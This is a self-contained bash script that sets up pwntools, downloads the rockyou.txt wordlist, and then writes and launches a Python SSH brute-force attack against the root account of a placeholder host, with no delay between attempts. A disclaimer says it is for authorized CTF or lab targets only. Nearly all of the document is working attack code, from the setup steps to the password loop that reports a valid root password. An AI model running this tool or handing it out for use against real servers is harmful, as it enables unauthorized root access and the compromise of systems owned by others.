#!/usr/bin/env bash
# Fully automated setup + SSH root brute-force on Debian 12
# WARNING: Brute-forcing real servers without permission is illegal!
# Use ONLY on authorized CTF targets or lab machines you control

set -euo pipefail

echo "Starting FULL AUTOMATED SETUP + BRUTE FORCE (Debian 12 Bookworm)"
echo "Target: targetgoeshere : portgoeshere (root)"
echo "This will take some time to download ~140MB rockyou.txt.gz..."
echo ""

# 1. Update system & install dependencies
echo "[1/7] Updating system and installing dependencies..."
sudo apt update -qq && sudo apt upgrade -y -qq
sudo apt install -y -qq python3 python3-pip python3-venv git curl wget gzip

# 2. Create virtual environment
echo "[2/7] Creating virtual environment ~/pwntools-env..."
python3 -m venv ~/pwntools-env
source ~/pwntools-env/bin/activate

# 3. Install pwntools
echo "[3/7] Installing pwntools (latest)..."
pip install --upgrade pip -q
pip install pwntools --break-system-packages -q

# 4. Download & decompress rockyou.txt
ROCKYOU_GZ="/tmp/rockyou.txt.gz"
ROCKYOU_TXT="$HOME/rockyou.txt"

echo "[4/7] Downloading rockyou.txt.gz from official Kali mirror..."
wget -q --show-progress https://gitlab.com/kalilinux/packages/wordlists/-/raw/kali/master/rockyou.txt.gz -O "$ROCKYOU_GZ"

echo "[5/7] Unpacking rockyou.txt..."
gunzip -c "$ROCKYOU_GZ" > "$ROCKYOU_TXT"
rm -f "$ROCKYOU_GZ"

echo "[+] rockyou.txt ready: $(wc -l < "$ROCKYOU_TXT") lines"

# 6. Create the brute-force script with your requested banner
SCRIPT_PATH="$HOME/ssh_root_brute_rockyou.py"

echo "[6/7] Creating brute-force script..."
cat > "$SCRIPT_PATH" << 'EOF'
#!/usr/bin/env python3
"""
Ultra-fast SSH root brute-force using rockyou.txt
MAXIMUM SPEED - almost no delay
"""

from pwn import *
import sys
import time
import os

# Banner (exactly as requested)
banner = """
    ██████╗ ██╗    ██╗███╗   ██╗          
    ██╔══██╗██║    ██║████╗  ██║          
    ██████╔╝██║ █╗ ██║██╔██╗ ██║          
    ██╔═══╝ ██║███╗██║██║╚██╗██║          
    ██║     ╚███╔███╔╝██║ ╚████║          
    ╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝          
                                          
██████╗ ██████╗ ██╗   ██╗████████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝
Made By Taylor Christian Newsome
Credit to https://github.com/Gallopsled/pwntools/ for pwntools code
"""

print(banner)

# ================= CONFIG =================
TARGET_IP   = "targetip"
TARGET_PORT = targetport
USERNAME    = "root"

ROCKYOU_PATH = os.path.expanduser("~/rockyou.txt")

TIMEOUT_CONNECT = 3.0
TIMEOUT_AUTH    = 3.5
MIN_DELAY       = 0.00               # 0 = max speed, very high ban risk

context.log_level = 'info'

# ================= LOAD PASSWORDS =================
try:
    with open(ROCKYOU_PATH, 'r', encoding='latin-1', errors='ignore') as f:
        passwords = [line.strip() for line in f if line.strip()]
    print(f"[+] Loaded {len(passwords):,} passwords from rockyou.txt")
except Exception as e:
    print(f"[!] Failed to load rockyou: {e}")
    sys.exit(1)

# ================= BRUTE FUNCTION =================
def try_ssh(password):
    try:
        s = ssh(
            host=TARGET_IP,
            port=TARGET_PORT,
            user=USERNAME,
            password=password,
            timeout=TIMEOUT_CONNECT,
            alive_interval=1,
            alive_count_max=1,
            banner_timeout=TIMEOUT_CONNECT,
            auth_timeout=TIMEOUT_AUTH
        )
        s.close()
        return True, "SUCCESS - valid credentials"

    except EOFError:
        return False, "connection closed / timeout"
    except Exception as e:
        err = str(e).lower()
        if any(x in err for x in ["authentication failed", "permission denied", "bad password"]):
            return False, "wrong password"
        elif "refused" in err or "no route" in err:
            return False, "connection refused / host down"
        elif "banner" in err or "timeout" in err:
            return False, "timeout/banner error"
        else:
            return False, f"error: {str(e)[:70]}"

# ================= MAIN =================
print("=" * 90)
print(f"  SSH root brute-force → {TARGET_IP}:{TARGET_PORT}")
print(f"  Username: {USERNAME}")
print(f"  Passwords: {len(passwords):,} (rockyou.txt)")
print("  MODE: MAXIMUM SPEED - NO DELAY")
print("  WARNING: Will almost certainly get IP-banned after 5–50 attempts")
print("=" * 90)

attempts = 0
found = False

for pwd in passwords:
    attempts += 1
    
    success, msg = try_ssh(pwd)
    
    if success:
        print("\n" + "═"*100)
        print("  ★★★ VALID ROOT PASSWORD FOUND ★★★")
        print(f"  Host:     {TARGET_IP}:{TARGET_PORT}")
        print(f"  User:     {USERNAME}")
        print(f"  Password: {pwd}")
        print("═"*100)
        found = True
        break
    
    if attempts % 50 == 0:
        print(f"[{attempts:6d}] {pwd:<35} → {msg}")

    if MIN_DELAY > 0:
        time.sleep(MIN_DELAY)

if not found:
    print("\n[-] Finished rockyou.txt without success")
    print("    Most likely:")
    print("    • IP got banned very early")
    print("    • Root login disabled on server")
    print("    • Password not in rockyou")

print(f"\nTotal attempts: {attempts:,}")
if found:
    print("Use responsibly and legally!")
else:
    print("Scan finished.")
EOF

# 7. Make executable
chmod +x "$SCRIPT_PATH"

# 8. Run it!
echo ""
echo "[7/7] Setup complete! Starting brute-force now..."
echo "     (Press Ctrl+C to stop anytime)"
echo ""

# Activate venv and run
source ~/pwntools-env/bin/activate
python3 "$SCRIPT_PATH"
